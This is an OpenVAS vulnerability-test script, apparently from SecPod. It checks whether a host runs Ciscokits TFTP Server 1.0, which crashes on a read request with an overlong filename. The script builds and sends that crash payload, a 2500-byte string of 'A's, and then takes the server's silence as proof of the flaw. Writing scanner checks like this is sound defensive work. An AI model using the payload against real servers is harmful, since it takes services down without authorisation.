###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ciscokits_tftp_server_dos_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Ciscokits TFTP Server Long Filename Denial Of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to cause denial of service
  attacks.";
tag_affected = "Ciscokits TFTP Server version 1.0";
tag_insight = "The flaw is due to an error when handling a long file name read
  request, which can be exploited by remote unauthenticated attackers to
  crash an affected application.";
tag_solution = "No solution or patch is available as of 27th July, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.certificationkits.com/tftpserver/tftpserver.zip";
tag_summary = "This host is running Ciscokits TFTP Server and is prone to
  denial of service vulnerability.";

if(description)
{
  script_id(902460);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-07-27 14:47:11 +0200 (Wed, 27 Jul 2011)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Ciscokits TFTP Server Long Filename Denial Of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17569/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/103321/ciscokits-dos.txt");

  script_description(desc);
  script_summary("Check for the denial of service vulnerability in Ciscokits TFTP Server");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Denial of Service");
  script_require_keys("Services/udp/tftp");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


## Check for tftp service
port = get_kb_item("Services/udp/tftp");
if(!port){
  port = 69;
}

## open socket for udp port
soc = open_sock_udp(port);
if(!soc){
  exit(0);
}

## Construct the request for non existing file
request = raw_string(0x00, 0x01, 0x6d, 0x79, 0x74, 0x65, 0x73, 0x74,
                     0x2e, 0x74, 0x78, 0x74, 0x00, 0x6e, 0x65, 0x74,
                     0x61, 0x73, 0x63, 0x69, 0x69, 0x00);

## Confirm the server is running and responding for non existing file
## as Not Found in local Storage
send(socket:soc, data:request);
result = recv(socket:soc, length:100);
if(isnull(result) && "Not Found in local Storage" >!< result){
  exit(0);
}

##  Construct the attack request with long file name
attack = raw_string(0x00, 0x01) + crap(data:raw_string(0x41), length: 2500) +
         raw_string(0x00, 0x6e,0x65, 0x74, 0x61, 0x73, 0x63, 0x69, 0x69, 0x00);

## Send the constructed attack request to the socket
send(socket:soc, data:attack);

## Again send the request for the non existing file to confirm exploit
request = raw_string(0x00, 0x01, 0x6d, 0x79, 0x74, 0x65, 0x73, 0x74,
                     0x2e, 0x74, 0x78, 0x74, 0x00, 0x6e, 0x65, 0x74,
                     0x61, 0x73, 0x63, 0x69, 0x69, 0x00);

send(socket:soc, data:request);
close(soc);

## confirm server got crashed if it is not responding
result = recv(socket:soc, length:100);
if(isnull(result) && "Not Found in local Storage" >!< result){
  security_hole(port);
}
